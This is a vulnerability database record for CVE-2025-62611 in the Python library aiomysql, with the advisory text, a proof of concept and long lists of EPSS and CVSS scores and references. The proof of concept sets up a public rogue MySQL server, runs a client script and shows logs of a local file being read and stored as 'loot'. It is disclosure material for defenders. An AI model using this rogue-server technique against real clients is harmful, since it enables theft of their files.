vulnerability_id: VCID-5h8s-4wh7-byca
aliases:
  - CVE-2025-62611
  - GHSA-r397-ff8c-wv2g
summary: |
  aiomysql allows arbitrary access to client files through vulnerability of a malicious MySQL server
  ### Summary
  The client-side settings are not checked before sending local files to MySQL server, which allows obtaining arbitrary files from the client using a rogue server.

  ### Details
  It is possible to create a rogue MySQL server that emulates authorization, ignores client flags and requests arbitrary files from the client by sending a LOAD_LOCAL instruction packet. Related to CVE-2019-2503.

  ### PoC
  First, start up a rogue MySQL server that ignores client-side flags and sends LOAD_LOCAL packet to the client – tested with https://github.com/rmb122/rogue_mysql_server

  1. Create a file to be stolen by the rogue server: `echo "gotcha" > /tmp/my_secret_file.txt`
  2. Clone the repo: `git clone git@github.com:rmb122/rogue_mysql_server.git && cd rogue_mysql_server`
  3. Build the server: `make rogue_mysql_server`
  4. Generate a sample config: `rogue_mysql_server -generate`
  5. In `config.yaml` change `file_list` to `["/tmp/my_secret_file.txt"]`
  6. Run the server: `./rogue_mysql_server -config config.yaml`

  Next, the vulnerability can be seen in action with the following script, which can be run in a second terminal:
  ```python3
  import asyncio

  import aiomysql


  loop = asyncio.get_event_loop()


  async def test_example():
      conn = await aiomysql.connect(
          host="127.0.0.1",
          port=3306,
          user="root",
          password="",
          db="mysql",
          loop=loop,
          local_infile=0, # note that we explicitly forbid local_infile
      )

      cursor = await conn.cursor()
      await cursor.execute("SELECT 1")
      print(cursor.description)
      r = await cursor.fetchall()
      print(r)
      await cursor.close()
      conn.close()


  loop.run_until_complete(test_example())
  ```

  The rogue server will output log messages indicating successful file read and save the contents in the `loot/` directory
  ```
  level=info msg="Client from addr [xxx], ID [1] try to query [select 1]"
  level=info msg="Now try to read file [/tmp/my_secret_file.txt] from addr [xxx], ID [1]"
  level=info msg="Read success, stored at [./loot/xxx/1757403852610__tmp_top_secret_file.txt]"
  level=info msg="Client leaved, Addr [xxx], ID [1]"
  ```

  ### Impact
  This vulnerability impacts products and environments that require connection to untrusted MySQL servers or allow the possibility for them to be compromised.

  ### Fix suggestion
  Can be fixed by porting relevant changes from PyMySQL – https://github.com/PyMySQL/PyMySQL/commit/b5e17cee46e0706dbfd707cdd2024452f0fb3267
severities:
  - score: '0.0004'
    scoring_system: epss
    scoring_elements: '0.11735'
    published_at: '2025-10-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.0004'
    scoring_system: epss
    scoring_elements: '0.11693'
    published_at: '2025-10-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.0004'
    scoring_system: epss
    scoring_elements: '0.11705'
    published_at: '2025-10-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.00052'
    scoring_system: epss
    scoring_elements: '0.16183'
    published_at: '2025-10-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.00052'
    scoring_system: epss
    scoring_elements: '0.16173'
    published_at: '2025-10-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.00052'
    scoring_system: epss
    scoring_elements: '0.16178'
    published_at: '2025-10-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.00052'
    scoring_system: epss
    scoring_elements: '0.1624'
    published_at: '2025-11-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.00052'
    scoring_system: epss
    scoring_elements: '0.16277'
    published_at: '2025-11-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.18951'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.18975'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-r397-ff8c-wv2g
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/aio-libs/aiomysql
  - score: '8.2'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/aio-libs/aiomysql/commit/32c4520dae3711367ded74a4726dcb8bb8919538
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/aio-libs/aiomysql/commit/32c4520dae3711367ded74a4726dcb8bb8919538
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-22T19:43:26Z/
    published_at: None
    url: https://github.com/aio-libs/aiomysql/commit/32c4520dae3711367ded74a4726dcb8bb8919538
  - score: '8.2'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/aio-libs/aiomysql/pull/1044
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/aio-libs/aiomysql/pull/1044
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-22T19:43:26Z/
    published_at: None
    url: https://github.com/aio-libs/aiomysql/pull/1044
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/aio-libs/aiomysql/security/advisories/GHSA-r397-ff8c-wv2g
  - score: '8.2'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/aio-libs/aiomysql/security/advisories/GHSA-r397-ff8c-wv2g
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/aio-libs/aiomysql/security/advisories/GHSA-r397-ff8c-wv2g
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-22T19:43:26Z/
    published_at: None
    url: https://github.com/aio-libs/aiomysql/security/advisories/GHSA-r397-ff8c-wv2g
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62611
weaknesses:
  - CWE-1035
  - CWE-937
  - CWE-73
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-62611
    reference_type:
    reference_id:
  - url: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-62611
    reference_type:
    reference_id:
  - url: https://github.com/aio-libs/aiomysql
    reference_type:
    reference_id:
  - url: https://github.com/aio-libs/aiomysql/commit/32c4520dae3711367ded74a4726dcb8bb8919538
    reference_type:
    reference_id:
  - url: https://github.com/aio-libs/aiomysql/pull/1044
    reference_type:
    reference_id:
  - url: https://github.com/aio-libs/aiomysql/security/advisories/GHSA-r397-ff8c-wv2g
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-62611
    reference_type:
    reference_id:
  - url: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1118754
    reference_type:
    reference_id: 1118754
  - url: https://github.com/advisories/GHSA-r397-ff8c-wv2g
    reference_type:
    reference_id: GHSA-r397-ff8c-wv2g
